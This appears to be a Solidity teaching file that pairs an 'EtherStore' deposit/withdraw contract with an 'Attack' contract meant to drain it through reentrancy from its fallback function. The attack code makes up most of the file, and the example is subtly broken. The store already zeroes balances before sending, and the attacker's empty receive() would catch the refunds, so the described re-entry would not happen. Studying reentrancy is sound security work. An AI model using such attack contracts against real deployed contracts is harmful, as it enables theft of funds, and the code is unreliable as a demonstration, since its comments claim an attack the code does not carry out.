// SPDX-License-Identifier: MIT
// Specifies the MIT license for the code.

pragma solidity ^0.8.0;
// Specifies compatibility with Solidity compiler version 0.8.0 and above.

contract EtherStore {
    mapping(address => uint) public balance;
    // Public mapping to store the balance of each address.

    function deposit() public payable {
        // Function to deposit Ether into the contract for the caller's address.
        balance[msg.sender] += msg.value;
        // Increases the caller's balance by the deposited amount.
    }

    function withdraw() public {
        // Function to withdraw the entire balance for the caller's address.
        uint bal = balance[msg.sender];
        // Stores the balance of the caller.
        require(bal > 0, "Insufficient balance");
        // Ensures that the caller has a positive balance.
        balance[msg.sender] = 0;
        // Resets the caller's balance to zero.
        (bool sent,) = msg.sender.call{value: bal}("");
        // Sends the Ether back to the caller.
        require(sent, "Transfer did not go through");
        // Ensures that the Ether transfer is successful.
    }
}

contract Attack {
    EtherStore public etherStore;
    // Public variable to store an instance of the EtherStore contract.
    uint constant public AMOUNT = 1 ether;
    // Constant variable representing the amount to be deposited and withdrawn.

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        // Initializes the EtherStore contract instance.
    }

    // Receive function to handle incoming Ether transfers
    receive() external payable {
        // Implement any logic for handling incoming Ether here (not specified in this example).
    }

    // Fallback function to handle calls without data and receive Ether
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
        // Calls the EtherStore contract's withdraw function if the balance is sufficient.
    }

    function attack() external payable {
        // Function to initiate the attack.
        require(msg.value >= AMOUNT);
        // Requires that the amount sent is equal to or greater than the specified amount.
        etherStore.deposit{value: AMOUNT}();
        // Calls the EtherStore contract's deposit function to deposit Ether.
        etherStore.withdraw();
        // Calls the EtherStore contract's withdraw function to attempt a reentrancy attack.
    }
}



